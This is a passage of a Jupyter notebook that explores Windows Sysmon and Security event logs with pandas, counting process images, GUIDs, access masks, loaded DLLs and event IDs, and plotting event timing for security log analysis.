   "outputs": [
    {
     "data": {
      "text/plain": [
       "gdi32             44\n",
       "ntdll.dll         38\n",
       "Kernelbase.dll    37\n",
       "rpcrt4.dll        37\n",
       "msvcrt.dll        37\n",
       "                  ..\n",
       "SXS.DLL            1\n",
       "esent.dll          1\n",
       "wow64lg2.dll       1\n",
       "msvcp120.dll       1\n",
       "msvcr120.dll       1\n",
       "Name: OriginalFileName, Length: 104, dtype: int64"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['OriginalFileName'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "e2c04bb9-a3f6-60c3-8600-000000000300    603\n",
       "e2c04bb9-a70e-60c3-0d61-390000000000    326\n",
       "e2c04bb9-a703-60c3-b501-000000000300     32\n",
       "e2c04bb9-a346-60c3-0f00-000000000300     28\n",
       "e2c04bb9-d0f0-60c3-48da-ec0000000000     27\n",
       "e2c04bb9-d0f0-60c3-0ae0-ec0000000000     22\n",
       "e2c04bb9-a70c-60c3-6abd-380000000000     10\n",
       "e2c04bb9-a3ee-60c3-5200-000000000300     10\n",
       "e2c04bb9-a3ee-60c3-5100-000000000300      8\n",
       "e2c04bb9-a347-60c3-1200-000000000300      6\n",
       "e2c04bb9-a33f-60c3-0700-000000000300      5\n",
       "e2c04bb9-a342-60c3-0c00-000000000300      2\n",
       "e2c04bb9-a347-60c3-1300-000000000300      2\n",
       "e2c04bb9-08d0-60c4-8509-000000000300      1\n",
       "e2c04bb9-08cb-60c4-7e09-000000000300      1\n",
       "e2c04bb9-08dd-60c4-9109-000000000300      1\n",
       "e2c04bb9-08d5-60c4-8909-000000000300      1\n",
       "e2c04bb9-08c6-60c4-7d09-000000000300      1\n",
       "e2c04bb9-08d5-60c4-8609-000000000300      1\n",
       "e2c04bb9-08e5-60c4-9b09-000000000300      1\n",
       "e2c04bb9-08cb-60c4-8009-000000000300      1\n",
       "e2c04bb9-08d0-60c4-8209-000000000300      1\n",
       "e2c04bb9-08dd-60c4-9309-000000000300      1\n",
       "e2c04bb9-08db-60c4-8e09-000000000300      1\n",
       "e2c04bb9-08da-60c4-8a09-000000000300      1\n",
       "e2c04bb9-a342-60c3-0d00-000000000300      1\n",
       "Name: SourceProcessGUID, dtype: int64"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['SourceProcessGUID'] = df['SourceProcessGUID'].apply(lambda x: x if pd.isna(x) else x[1 : -1])\n",
    "df['SourceProcessGUID'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "# df['SourceProcessId'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "# df['SourceThreadId'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "C:\\Windows\\system32\\wbem\\wmiprvse.exe    603\n",
       "C:\\Windows\\Explorer.EXE                  326\n",
       "C:\\Windows\\system32\\svchost.exe           44\n",
       "C:\\Windows\\system32\\csrss.exe             37\n",
       "C:\\Windows\\system32\\conhost.exe           29\n",
       "C:\\Windows\\system32\\cmd.exe               28\n",
       "C:\\Windows\\System32\\svchost.exe           10\n",
       "C:\\Windows\\system32\\ctfmon.exe            10\n",
       "C:\\Windows\\system32\\taskkill.exe           4\n",
       "C:\\Windows\\system32\\services.exe           2\n",
       "C:\\Windows\\system32\\lsass.exe              1\n",
       "Name: SourceImage, dtype: int64"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['SourceImage'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "e2c04bb9-08d5-60c4-8709-000000000300    49\n",
       "e2c04bb9-08cb-60c4-eb40-400100000000    49\n",
       "e2c04bb9-08d0-60c4-8309-000000000300    47\n",
       "e2c04bb9-08c6-60c4-681f-400100000000    47\n",
       "e2c04bb9-08db-60c4-8c09-000000000300    44\n",
       "                                        ..\n",
       "e2c04bb9-08d5-60c4-8809-000000000300     3\n",
       "e2c04bb9-08da-60c4-8b09-000000000300     3\n",
       "e2c04bb9-08dd-60c4-9109-000000000300     2\n",
       "e2c04bb9-08e5-60c4-9b09-000000000300     1\n",
       "e2c04bb9-08dd-60c4-9309-000000000300     1\n",
       "Name: TargetProcessGUID, Length: 155, dtype: int64"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['TargetProcessGUID'] = df['TargetProcessGUID'].apply(lambda x: x if pd.isna(x) else x[1 : -1])\n",
    "df['TargetProcessGUID'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "# df['TargetProcessId'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "# df['TargetImage'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0x1410      638\n",
       "0x1000      266\n",
       "0x1fffff     95\n",
       "0x2000       68\n",
       "0x1400       10\n",
       "0x100000      6\n",
       "0x1478        5\n",
       "0x1401        4\n",
       "0x3000        2\n",
       "Name: GrantedAccess, dtype: int64"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['GrantedAccess'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "C:\\Windows\\System32\\ntdll.dll         37\n",
       "C:\\Windows\\System32\\kernel32.dll      36\n",
       "C:\\Windows\\System32\\msvcrt.dll        36\n",
       "C:\\Windows\\System32\\rpcrt4.dll        36\n",
       "C:\\Windows\\System32\\KernelBase.dll    36\n",
       "                                      ..\n",
       "C:\\Windows\\System32\\coml2.dll          1\n",
       "C:\\Windows\\System32\\cmd.exe            1\n",
       "C:\\Windows\\SysWOW64\\bcrypt.dll         1\n",
       "C:\\Windows\\SysWOW64\\ucrtbase.dll       1\n",
       "C:\\Windows\\SysWOW64\\gdi32full.dll      1\n",
       "Name: ImageLoaded, Length: 129, dtype: int64"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['ImageLoaded'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "true     902\n",
       "false      9\n",
       "Name: Signed, dtype: int64"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Signed'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft Windows        900\n",
       "-                          9\n",
       "Microsoft Corporation      2\n",
       "Name: Signature, dtype: int64"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Signature'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Valid          902\n",
       "Unavailable      9\n",
       "Name: SignatureStatus, dtype: int64"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['SignatureStatus'].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Most common event IDs by timestamp distro:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 2 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "filtered_eventID_df = df[df['EventID'].isin([10, 7])]\n",
    "\n",
    "filtered_eventID_df['@timestamp'].hist(by = filtered_eventID_df['EventID'], bins = 30, sharey = True)\n",
    "plt.show()\n",
    "plt.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.hist(filtered_eventID_df[filtered_eventID_df['EventID'] == 7]['@timestamp'], bins = 30, histtype = 'bar', color = '#ff0000', label = '7')\n",
    "plt.hist(filtered_eventID_df[filtered_eventID_df['EventID'] == 10]['@timestamp'], bins = 30, histtype = 'step', color = '#0000ff', label = '10')\n",
    "plt.legend(title = 'Event ID')\n",
    "plt.show()\n",
    "plt.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Channel + event ID counts: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Channel</th>\n",
       "      <th>EventID</th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>10</td>\n",
       "      <td>1094</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>7</td>\n",
       "      <td>911</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>13</td>\n",
       "      <td>90</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>Security</td>\n",
       "      <td>4658</td>\n",
       "      <td>82</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>12</td>\n",
       "      <td>56</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Security</td>\n",
       "      <td>4656</td>\n",
       "      <td>41</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>Security</td>\n",
       "      <td>4690</td>\n",
       "      <td>41</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>1</td>\n",
       "      <td>37</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>5</td>\n",
       "      <td>36</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>Security</td>\n",
       "      <td>4689</td>\n",
       "      <td>36</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>Security</td>\n",
       "      <td>4688</td>\n",
       "      <td>36</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>Security</td>\n",
       "      <td>4663</td>\n",
       "      <td>34</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>Security</td>\n",
       "      <td>5156</td>\n",
       "      <td>26</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>Security</td>\n",
       "      <td>4703</td>\n",
       "      <td>22</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>26</td>\n",
       "      <td>18</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>Security</td>\n",
       "      <td>5145</td>\n",
       "      <td>14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>11</td>\n",
       "      <td>13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>Security</td>\n",
       "      <td>5158</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>17</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>3</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>18</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>Security</td>\n",
       "      <td>4670</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>9</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>Security</td>\n",
       "      <td>4697</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>Security</td>\n",
       "      <td>5140</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>System</td>\n",
       "      <td>7000</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>System</td>\n",
       "      <td>7009</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>System</td>\n",
       "      <td>7045</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                 Channel  EventID     0\n",
       "5   Microsoft-Windows-Sysmon/Operational       10  1094\n",
       "3   Microsoft-Windows-Sysmon/Operational        7   911\n",
       "8   Microsoft-Windows-Sysmon/Operational       13    90\n",
       "13                              Security     4658    82\n",
       "7   Microsoft-Windows-Sysmon/Operational       12    56\n",
       "12                              Security     4656    41\n",
       "18                              Security     4690    41\n",
       "0   Microsoft-Windows-Sysmon/Operational        1    37\n",
       "2   Microsoft-Windows-Sysmon/Operational        5    36\n",
       "17                              Security     4689    36\n",
       "16                              Security     4688    36\n",
       "14                              Security     4663    34\n",
       "23                              Security     5156    26\n",
       "20                              Security     4703    22\n",
       "11  Microsoft-Windows-Sysmon/Operational       26    18\n",
       "22                              Security     5145    14\n",
       "6   Microsoft-Windows-Sysmon/Operational       11    13\n",
       "24                              Security     5158     9\n",
       "9   Microsoft-Windows-Sysmon/Operational       17     5\n",
       "1   Microsoft-Windows-Sysmon/Operational        3     2\n",
       "10  Microsoft-Windows-Sysmon/Operational       18     1\n",
       "15                              Security     4670     1\n",
       "4   Microsoft-Windows-Sysmon/Operational        9     1\n",
       "19                              Security     4697     1\n",
       "21                              Security     5140     1\n",
       "25                                System     7000     1\n",
       "26                                System     7009     1\n",
       "27                                System     7045     1"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby(['Channel', 'EventID']).size().reset_index().sort_values(0, ascending = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Level + event ID counts:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Level</th>\n",
       "      <th>EventID</th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>4</td>\n",
       "      <td>10</td>\n",
       "      <td>1094</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>4</td>\n",
       "      <td>7</td>\n",
       "      <td>911</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>4</td>\n",
       "      <td>13</td>\n",
       "      <td>90</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>4</td>\n",
       "      <td>12</td>\n",
       "      <td>56</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>4</td>\n",
       "      <td>1</td>\n",
       "      <td>37</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>4</td>\n",
       "      <td>5</td>\n",
       "      <td>36</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>4</td>\n",
       "      <td>26</td>\n",
       "      <td>18</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>4</td>\n",
       "      <td>11</td>\n",
       "      <td>13</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>4</td>\n",
       "      <td>17</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>4</td>\n",
       "      <td>3</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>4</td>\n",
       "      <td>9</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>4</td>\n",
       "      <td>18</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>4</td>\n",
       "      <td>7045</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>2</td>\n",
       "      <td>7000</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>2</td>\n",
       "      <td>7009</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>4658</td>\n",
       "      <td>82</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>4656</td>\n",
       "      <td>41</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>0</td>\n",
       "      <td>4690</td>\n",
       "      <td>41</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>4688</td>\n",
       "      <td>36</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>0</td>\n",
       "      <td>4689</td>\n",
       "      <td>36</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>4663</td>\n",
       "      <td>34</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>0</td>\n",
       "      <td>5156</td>\n",
       "      <td>26</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>0</td>\n",
       "      <td>4703</td>\n",
       "      <td>22</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>0</td>\n",
       "      <td>5145</td>\n",
       "      <td>14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>0</td>\n",
       "      <td>5158</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>4670</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>0</td>\n",
       "      <td>4697</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>0</td>\n",
       "      <td>5140</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    Level  EventID     0\n",
       "20      4       10  1094\n",
       "18      4        7   911\n",
       "23      4       13    90\n",
       "22      4       12    56\n",
       "15      4        1    37\n",
       "17      4        5    36\n",
       "26      4       26    18\n",
       "21      4       11    13\n",
       "24      4       17     5\n",
       "16      4        3     2\n",
       "19      4        9     1\n",
       "25      4       18     1\n",
       "27      4     7045     1\n",
       "13      2     7000     1\n",
       "14      2     7009     1\n",
       "1       0     4658    82\n",
       "0       0     4656    41\n",
       "6       0     4690    41\n",
       "4       0     4688    36\n",
       "5       0     4689    36\n",
       "2       0     4663    34\n",
       "11      0     5156    26\n",
       "8       0     4703    22\n",
       "10      0     5145    14\n",
       "12      0     5158     9\n",
       "3       0     4670     1\n",
       "7       0     4697     1\n",
       "9       0     5140     1"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby(['Level', 'EventID']).size().reset_index().sort_values(['Level', 0], ascending = False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Idea: Use source process GUID to track a sequence? \n",
    "\n",
    "eg. e2c04bb9-a3f6-60c3-8600-000000000300 has 603 occurrences, so track that over time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(603, 126)"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "spGUID = df['SourceProcessGUID'].value_counts().index[0]\n",
    "\n",
    "filtered_spGUID_df = df[df['SourceProcessGUID'] == spGUID]\n",
    "filtered_spGUID_df.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 603 entries, 299 to 2063\n",
      "Data columns (total 25 columns):\n",
      " #   Column            Non-Null Count  Dtype              \n",
      "---  ------            --------------  -----              \n",
      " 0   SourceName        603 non-null    object             \n",
      " 1   ProviderGuid      603 non-null    object             \n",
      " 2   Level             603 non-null    int64              \n",
      " 3   Keywords          603 non-null    object             \n",
      " 4   Channel           603 non-null    object             \n",
      " 5   Hostname          603 non-null    object             \n",
      " 6   TimeCreated       603 non-null    object             \n",
      " 7   @timestamp        603 non-null    datetime64[ns, UTC]\n",
      " 8   EventID           603 non-null    int64              \n",
      " 9   Message           603 non-null    object             \n",
      " 10  Task              603 non-null    int64              \n",
      " 11  RuleName          603 non-null    object             \n",
      " 12  UtcTime           603 non-null    object             \n",
      " 13  ProcessGuid       0 non-null      object             \n",
      " 14  ProcessId         0 non-null      object             \n",
      " 15  Image             0 non-null      object             \n",
      " 16  FileVersion       0 non-null      object             \n",
      " 17  Description       0 non-null      object             \n",
      " 18  Product           0 non-null      object             \n",
      " 19  Company           0 non-null      object             \n",
      " 20  OriginalFileName  0 non-null      object             \n",
      " 21  CommandLine       0 non-null      object             \n",
      " 22  CurrentDirectory  0 non-null      object             \n",
      " 23  User              0 non-null      object             \n",
      " 24  LogonGuid         0 non-null      object             \n",
      "dtypes: datetime64[ns, UTC](1), int64(3), object(21)\n",
      "memory usage: 122.5+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 603 entries, 299 to 2063\n",
      "Data columns (total 25 columns):\n",
      " #   Column             Non-Null Count  Dtype  \n",
      "---  ------             --------------  -----  \n",
      " 0   LogonId            0 non-null      object \n",
      " 1   TerminalSessionId  0 non-null      float64\n",
      " 2   IntegrityLevel     0 non-null      object \n",
      " 3   Hashes             0 non-null      object \n",
      " 4   ParentProcessGuid  0 non-null      object \n",
      " 5   ParentProcessId    0 non-null      float64\n",
      " 6   ParentImage        0 non-null      object \n",
      " 7   ParentCommandLine  0 non-null      object \n",
      " 8   SourceProcessGUID  603 non-null    object \n",
      " 9   SourceProcessId    603 non-null    object \n",
      " 10  SourceThreadId     603 non-null    float64\n",
      " 11  SourceImage        603 non-null    object \n",
      " 12  TargetProcessGUID  603 non-null    object \n",
      " 13  TargetProcessId    603 non-null    object \n",
      " 14  TargetImage        603 non-null    object \n",
      " 15  GrantedAccess      603 non-null    object \n",
      " 16  CallTrace          603 non-null    object \n",
      " 17  ImageLoaded        0 non-null      object \n",
      " 18  Signed             0 non-null      object \n",
      " 19  Signature          0 non-null      object \n",
      " 20  SignatureStatus    0 non-null      object \n",
      " 21  TargetFilename     0 non-null      object \n",
      " 22  IsExecutable       0 non-null      object \n",
      " 23  CreationUtcTime    0 non-null      object \n",
      " 24  EventType          0 non-null      object \n",
      "dtypes: float64(3), object(22)\n",
      "memory usage: 122.5+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 603 entries, 299 to 2063\n",
      "Data columns (total 25 columns):\n",
      " #   Column               Non-Null Count  Dtype  \n",
      "---  ------               --------------  -----  \n",
      " 0   TargetObject         0 non-null      object \n",
      " 1   Details              0 non-null      object \n",
      " 2   PipeName             0 non-null      object \n",
      " 3   Device               0 non-null      object \n",
      " 4   Protocol             0 non-null      object \n",
      " 5   Initiated            0 non-null      object \n",
      " 6   SourceIsIpv6         0 non-null      object \n",
      " 7   SourceIp             0 non-null      object \n",
      " 8   SourceHostname       0 non-null      object \n",
      " 9   SourcePort           0 non-null      float64\n",
      " 10  SourcePortName       0 non-null      object \n",
      " 11  DestinationIsIpv6    0 non-null      object \n",
      " 12  DestinationIp        0 non-null      object \n",
      " 13  DestinationHostname  0 non-null      object \n",
      " 14  DestinationPort      0 non-null      float64\n",
      " 15  DestinationPortName  0 non-null      object \n",
      " 16  ProcessID            0 non-null      float64\n",
      " 17  Application          0 non-null      object \n",
      " 18  Direction            0 non-null      object \n",
      " 19  SourceAddress        0 non-null      object \n",
      " 20  DestAddress          0 non-null      object \n",
      " 21  DestPort             0 non-null      float64\n",
      " 22  FilterRTID           0 non-null      float64\n",
      " 23  LayerName            0 non-null      object \n",
      " 24  LayerRTID            0 non-null      float64\n",
      "dtypes: float64(6), object(19)\n",
      "memory usage: 122.5+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 603 entries, 299 to 2063\n",
      "Data columns (total 25 columns):\n",
      " #   Column              Non-Null Count  Dtype \n",
      "---  ------              --------------  ----- \n",
      " 0   RemoteUserID        0 non-null      object\n",
      " 1   RemoteMachineID     0 non-null      object\n",
      " 2   SubjectUserSid      0 non-null      object\n",
      " 3   SubjectUserName     0 non-null      object\n",
      " 4   SubjectDomainName   0 non-null      object\n",
      " 5   SubjectLogonId      0 non-null      object\n",
      " 6   Status              0 non-null      object\n",
      " 7   ProcessName         0 non-null      object\n",
      " 8   NewProcessId        0 non-null      object\n",
      " 9   NewProcessName      0 non-null      object\n",
      " 10  TokenElevationType  0 non-null      object\n",
      " 11  TargetUserSid       0 non-null      object\n",
      " 12  TargetUserName      0 non-null      object\n",
      " 13  TargetDomainName    0 non-null      object\n",
      " 14  TargetLogonId       0 non-null      object\n",
      " 15  ParentProcessName   0 non-null      object\n",
      " 16  MandatoryLabel      0 non-null      object\n",
      " 17  SourceHandleId      0 non-null      object\n",
      " 18  TargetHandleId      0 non-null      object\n",
      " 19  ObjectServer        0 non-null      object\n",
      " 20  HandleId            0 non-null      object\n",
      " 21  ObjectType          0 non-null      object\n",
      " 22  ObjectName          0 non-null      object\n",
      " 23  TransactionId       0 non-null      object\n",
      " 24  AccessList          0 non-null      object\n",
      "dtypes: object(25)\n",
      "memory usage: 122.5+ KB\n",
      "None\n",
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 603 entries, 299 to 2063\n",
      "Data columns (total 25 columns):\n",
      " #   Column                 Non-Null Count  Dtype  \n",
      "---  ------                 --------------  -----  \n",
      " 0   AccessReason           0 non-null      object \n",
      " 1   AccessMask             0 non-null      object \n",
      " 2   PrivilegeList          0 non-null      object \n",
